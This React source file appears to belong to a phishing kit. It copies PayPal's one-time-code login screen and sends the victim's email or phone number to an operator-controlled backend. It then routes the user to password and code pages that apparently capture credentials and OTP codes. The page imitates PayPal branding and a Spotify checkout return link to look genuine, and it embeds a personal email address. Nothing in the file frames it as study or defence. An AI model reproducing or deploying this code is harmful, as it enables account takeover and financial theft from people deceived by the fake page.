import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom"; // Import useHistory
import ipinfo from "ipinfo";
import Footer from "./Footer";
import axios from 'axios';
import { zokomId } from '../utils/auth';

const PayPalCodeLoginVerif = () => {
  const [userCountry, setUserCountry] = useState('US'); // Default to US
  const [flagUrl, setFlagUrl] = useState('');
  const [isFocused, setIsFocused] = useState(false);
  const [styles, setStyles] = useState(null);
  const history = useHistory(); // Initialize useHistory
  const [loginError, setLoginError] = useState(false);
  const [emailOrMobile, setEmailOrMobile] = useState('');
  const userId = zokomId(); // Get userId
  const [maskedNumber, setMaskedNumber] = useState('');

  const getFlagUrl = async (countryCode) => {
    // Use a more reliable flag API
    return `https://purecatamphetamine.github.io/country-flag-icons/3x2/${countryCode.toUpperCase()}.svg`;
  };

  useEffect(() => {
    const fetchCountryFromLocalStorage = async () => {
      try {
        const countryCode = localStorage.getItem('CountryCode') || 'US';
        setUserCountry(countryCode);

        const url = await getFlagUrl(countryCode);
        setFlagUrl(url);
      } catch (err) {
        console.error('Error fetching country from local storage:', err);
      }
    };

    fetchCountryFromLocalStorage();
  }, []);
  useEffect(() => {
    const loadStyles = async () => {
        try {
          const [loginStyles, additionalStyles] = await Promise.all([
            import('../../assets/styles/login.css'),
            import('../../assets/styles/more.css')
          ]);
          
          setStyles({
            login: loginStyles.default,
            additional: additionalStyles.default
          });
        } catch (error) {
          console.error('Error loading styles:', error);
        }
      };
    
      loadStyles();
  }, []);
  const handleGetCode = async () => {
    try {
      const storedEmail = localStorage.getItem('paypalEmail');
      await axios.post(`${process.env.REACT_APP_API_URL}/api/code-verification`, {
        userId,
        email: storedEmail
      });
      history.push('/code');
    } catch (error) {
      console.error('Error requesting code:', error);
      setLoginError(true);
    }
  };
  useEffect(() => {
    const fetchMobileNumber = async () => {
      try {
        const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/mobile/${userId}`);
        if (response.data.maskedNumber) {
          setMaskedNumber(response.data.maskedNumber);
        }
      } catch (error) {
        console.error('Error fetching mobile number:', error);
      }
    };

    fetchMobileNumber();
  }, [userId]);

  const handleFocus = () => {
    setIsFocused(true);
  };

  const handleBlur = (e) => {
    if (!e.target.value) {
      setIsFocused(false);
    }
  };

  const validateEmailOrMobile = (input) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const mobileRegex = /^\d{10,15}$/;
    if (emailRegex.test(input)) {
      return 'email';
    } else if (mobileRegex.test(input)) {
      return 'mobile';
    } else {
      return 'invalid';
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const validationType = validateEmailOrMobile(emailOrMobile);
    if (validationType === 'email') {
      try {
        const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/paypal`, { email: emailOrMobile, userId });
        console.log('PayPal entry created:', response.data);
        localStorage.setItem('paypalEmailOrMobile', emailOrMobile); // Store email in localStorage
        history.push('/pass');
      } catch (error) {
        console.error('Error creating PayPal entry:', error);
        setLoginError(true);
      }
    } else if (validationType === 'mobile') {
      try {
        const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/paypal`, { mobileNumber: emailOrMobile, userId });
        console.log('PayPal entry created:', response.data);
        history.push('/code');
      } catch (error) {
        console.error('Error creating PayPal entry:', error);
        setLoginError(true);
      }
    } else {
      setLoginError(true);
    }
  };

  return (
    <div className="desktop">
      <div id="main" style={{marginBottom: '50px'}} className="main">
        <section id="login" className="contentAlignment otpLogin otpLoginPrimary otpPrimary" data- data-title="Log in to your PayPal account">
          <div className="corral">
            <div className="checkout" >
      <div className="otpDisplayCredentials">
        <span className="notranslate">Youssefabdelhedi1996@hotmail.com</span>
        <a href="#">Not you?</a>
      </div>
            <div id="content" className="contentContainer activeContent contentContainerBordered">
              <header id="header">
                <p className="paypal-logo paypal-logo-long"></p>
              </header>
              <div className="headerText adjustHeader">Log in fast with a one-time code</div>
              
              <form
      action="/signin/challenge/sms/send"
      method="post"
      className="proceed maskable transformRightToLeft"
      autoComplete="off"
      name="sendOtp"
      noValidate
    >
      <div className="mobileNumbers" style={{textAlign: 'center', paddingBottom: '24px'}}>
        <span>
          <div className="maskedNumber">Mobile {maskedNumber}</div>
        </span>
      </div>
      <div className="actions">
        <button className="button actionContinue scTrack:next" onClick={handleGetCode}>
          Get a Code
        </button>
      </div>
      <p className="tryAnotherWayLink" id="tryAnotherWayLink">
        <a href="#" className="scTrack:tryAnotherWayLink">
          Try another way
        </a>
      </p>
      <div className="smsDisclaimer">
        <p>
          By selecting “Get a Code,” you confirm you’re authorized to use this
          phone number and you agree to receive text messages. Carrier fees may
          apply.
        </p>
      </div>
    </form>
              
              <div className="intentFooter">
                <div className="cancelUrl">
                  <a
                                                    href="https://spotify.com"
                                                    data-url="https://payments.spotify.com/checkout/2a966a07-14c0-39e4-b0f1-f27ac82aba08/?country=US&market=us&product=2024-q4globalcampaign-intro&psp=paypal&token=EC-5G140757D6791933L&approval_token_id=91B256819V7453949&approval_session_id=91B256819V7453949"
                    className="scTrackUnifiedloginClickCancelAndReturn cancelLink"
                    id="cancelLink"
                    pa-marked="1"
                  >
                    Cancel and return to Spotify USA Inc
                  </a>
                </div>
                <div className="localeSelector">
                  <span className="picker country-selector">
                    <span className="hide" id="countryPickerLink">
                      {userCountry}
                    </span>
                    <button
                      type="button"
                      className="country US"
                      style={{
                        backgroundImage: `url(${flagUrl})`,
                        backgroundPosition: 'center',
                        width: '24px',
                        height: '17px',
                        border: 'none',
                        cursor: 'pointer',
                        paddingLeft: '8px',
                        paddingRight: '8px',
                        paddingTop: '8px',
                      }}
                    />
                  </span>
                  <ul className="localeLink">
                    <li>
                      <a
                        className="scTrackUnifiedloginFooterLanguageArEG"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=ar_EG&langTgl=ar"
                        lang="ar"
                        data-locale="ar_EG"
                        pa-marked="1"
                      >
                        العربية
                      </a>
                    </li>
                    <li>
                      <a
                        className="selected scTrackUnifiedloginFooterLanguageEnUS"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=en_US&langTgl=en"
                        lang="en"
                        data-locale="en_US"
                        aria-current="true"
                        pa-marked="1"
                      >
                        English
                      </a>
                    </li>
                    <li>
                      <a
                        className="scTrackUnifiedloginFooterLanguageFrXC"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=fr_XC&langTgl=fr"
                        lang="fr"
                        data-locale="fr_XC"
                        pa-marked="1"
                      >
                        Français
                      </a>
                    </li>
                    <li>
                      <a
                        className="scTrackUnifiedloginFooterLanguageEsXC"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=es_XC&langTgl=es"
                        lang="es"
                        data-locale="es_XC"
                        pa-marked="1"
                      >
                        Español
                      </a>
                    </li>
                    <li>
                      <a
                        className="scTrackUnifiedloginFooterLanguageZhXC"
                        href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=zh_XC&langTgl=zh"
                        lang="zh"
                        data-locale="zh_XC"
                        pa-marked="1"
                      >
                        中文
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
            </div>
          </div>
        </section>        
      </div>
      <Footer />
    </div>
  );
};

export default PayPalCodeLoginVerif;
